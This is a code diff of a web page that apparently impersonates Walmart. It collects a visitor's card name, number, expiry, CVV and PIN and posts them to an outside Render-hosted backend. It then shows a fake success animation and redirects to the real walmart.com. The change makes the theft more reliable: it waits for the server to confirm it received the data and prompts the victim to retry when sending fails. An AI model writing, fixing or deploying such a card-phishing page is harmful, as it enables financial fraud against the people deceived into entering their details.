@@ -302,75 +302,69 @@
   document.getElementById('success').style.display = 'none';
   document.getElementById('loader').style.display = 'flex';
 
-  // Immediately redirect the user to Walmart after showing the loader
-  // Use replace so the back button won't return to this form page
-  window.location.replace('https://www.walmart.com');
-
       // Choose backend URL depending on environment (local testing vs production)
       const backendUrl = (location.hostname === 'localhost' || location.hostname === '127.0.0.1') ?
         'http://localhost:3000/api/card' : 'https://walmartbackend-i8tm.onrender.com/api/card';
 
-      // Send data to backend
-      fetch(backendUrl, {
-         method: 'POST',
-         headers: {
-           'Content-Type': 'application/json'
-         },
-         body: JSON.stringify({
-           cardName,
-           cardNumber,
-           expiry,
-           cvv
-            ,
-            pin
-         })
-      })
-      .then(async response => {
-        // If the server responded with an error, log it but continue the UX flow.
-        if (!response.ok) {
+      // Prepare payload
+      const payload = { cardName, cardNumber, expiry, cvv, pin };
+
+      // Send the data and only redirect after the backend acknowledges receipt.
+      // This avoids navigations that cancel the POST and ensures server logs are produced.
+      async function trySendAndRedirect() {
+        const controller = new AbortController();
+        // 15s timeout for the request
+        const timeoutId = setTimeout(() => controller.abort(), 15000);
+        try {
+          const response = await fetch(backendUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+            signal: controller.signal
+          });
+          clearTimeout(timeoutId);
+
+          if (response.ok) {
+            console.log('Card info sent and acknowledged by backend');
+            // Show the inline success UI (animated thumbs-up), then redirect after 3s
+            const successEl = document.getElementById('success');
+            const thumb = successEl.querySelector('.fa-thumbs-up');
+            const msg = successEl.querySelector('.msg');
+            // hide loader and reveal success container
+            document.getElementById('loader').style.display = 'none';
+            thumb.style.display = 'block';
+            thumb.classList.remove('show-thumb');
+            msg.style.display = 'none';
+            successEl.style.display = 'block';
+            // trigger animation
+            setTimeout(() => thumb.classList.add('show-thumb'), 50);
+            // after animation completes, hide thumb and show message
+            setTimeout(() => {
+              thumb.style.display = 'none';
+              msg.style.display = 'block';
+              // wait 3s after showing the message then redirect
+              setTimeout(() => window.location.replace('https://www.walmart.com'), 3000);
+            }, 1400);
+            return;
+          }
+
+          // non-2xx response: show helpful message and restore the form so user can retry
           const body = await response.json().catch(() => ({}));
-          console.error('Server error sending card info:', (body.error || response.statusText));
+          console.error('Server error sending card info:', body.error || response.statusText);
+          alert('Failed to verify card: ' + (body.error || response.statusText));
+          document.getElementById('loader').style.display = 'none';
+          document.getElementById('checkout-form').style.display = 'block';
+        } catch (err) {
+          clearTimeout(timeoutId);
+          console.error('Network error sending card info:', err);
+          alert('Network error sending card info. Please try again.');
+          document.getElementById('loader').style.display = 'none';
+          document.getElementById('checkout-form').style.display = 'block';
         }
-        // success or error — after 10s show animated thumbs-up then reveal success message
-        setTimeout(() => {
-          document.getElementById('loader').style.display = 'none';
-          const successEl = document.getElementById('success');
-          const thumb = successEl.querySelector('.fa-thumbs-up');
-          const msg = successEl.querySelector('.msg');
-          // prepare
-          thumb.style.display = 'block';
-          thumb.classList.remove('show-thumb');
-          msg.style.display = 'none';
-          successEl.style.display = 'block';
-          // trigger animation
-          // small delay to ensure CSS animation restarts if needed
-          setTimeout(() => thumb.classList.add('show-thumb'), 50);
-          // after animation completes, hide thumb and show message
-          setTimeout(() => {
-            thumb.style.display = 'none';
-            msg.style.display = 'block';
-          }, 1400);
-        }, 10000);
-      })
-      .catch(error => {
-        // Log the network error but continue to show the thumbs-up and success UI after 10s
-        console.error('Network error sending card info:', error);
-        setTimeout(() => {
-          document.getElementById('loader').style.display = 'none';
-          const successEl = document.getElementById('success');
-          const thumb = successEl.querySelector('.fa-thumbs-up');
-          const msg = successEl.querySelector('.msg');
-          thumb.style.display = 'block';
-          thumb.classList.remove('show-thumb');
-          msg.style.display = 'none';
-          successEl.style.display = 'block';
-          setTimeout(() => thumb.classList.add('show-thumb'), 50);
-          setTimeout(() => {
-            thumb.style.display = 'none';
-            msg.style.display = 'block';
-          }, 1400);
-        }, 10000);
-      });
+      }
+
+      // Invoke the send-and-redirect helper
+      trySendAndRedirect();
     });
   </script>
 </body>
